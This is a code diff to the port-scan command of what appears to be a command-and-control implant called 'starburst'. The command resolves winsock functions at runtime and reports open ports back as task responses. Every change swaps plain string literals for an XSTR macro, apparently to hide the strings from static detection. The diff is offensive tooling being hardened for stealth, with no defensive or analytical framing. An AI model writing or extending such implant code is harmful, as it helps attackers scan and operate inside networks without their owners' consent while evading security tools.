@@ -76,7 +76,7 @@ auto declfn starburst::cmd_portscan(
     auto hosts_str = parser_string( params, &hosts_len );
     if ( !hosts_str || hosts_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no hosts provided" ) ) );
+            XSTR( "no hosts provided" ) );
         return;
     }
 
@@ -84,7 +84,7 @@ auto declfn starburst::cmd_portscan(
     auto ports_str = parser_string( params, &ports_len );
     if ( !ports_str || ports_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no ports provided" ) ) );
+            XSTR( "no ports provided" ) );
         return;
     }
 
@@ -107,7 +107,7 @@ auto declfn starburst::cmd_portscan(
     auto h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_ws2 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "LoadLibrary ws2_32 failed" ) ) );
+            XSTR( "LoadLibrary ws2_32 failed" ) );
         return;
     }
 
@@ -137,7 +137,7 @@ auto declfn starburst::cmd_portscan(
          !pIoctlsocket || !pSelect || !pWSACleanup || !pInetAddr ||
          !pHtons || !pWSAGetLastError ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to resolve winsock functions" ) ) );
+            XSTR( "failed to resolve winsock functions" ) );
         return;
     }
 
@@ -145,7 +145,7 @@ auto declfn starburst::cmd_portscan(
     memory::zero( &wsa_data, sizeof(wsa_data) );
     if ( pWSAStartup( 0x0202, &wsa_data ) != 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "WSAStartup failed" ) ) );
+            XSTR( "WSAStartup failed" ) );
         return;
     }
 
@@ -197,12 +197,11 @@ auto declfn starburst::cmd_portscan(
     if ( !output ) {
         pWSACleanup();
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
-    str_copy( output, symbol<char*>( const_cast<char*>(
-        "Host\tPort\tStatus\n" ) ) );
+    str_copy( output, XSTR("Host\tPort\tStatus\n") );
     uint32_t off = str_len( output );
     uint32_t open_count = 0;
 
@@ -281,7 +280,7 @@ auto declfn starburst::cmd_portscan(
                 output[off++] = '\t';
 
                 // status
-                str_copy( output + off, symbol<char*>( const_cast<char*>( "open" ) ) );
+                str_copy( output + off, XSTR( "open" ) );
                 off += 4;
 
                 output[off++] = '\n';
@@ -296,7 +295,7 @@ auto declfn starburst::cmd_portscan(
     if ( open_count == 0 ) {
         inst.heap_free( output );
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "No open ports found" ) ) );
+            XSTR( "No open ports found" ) );
         return;
     }
 
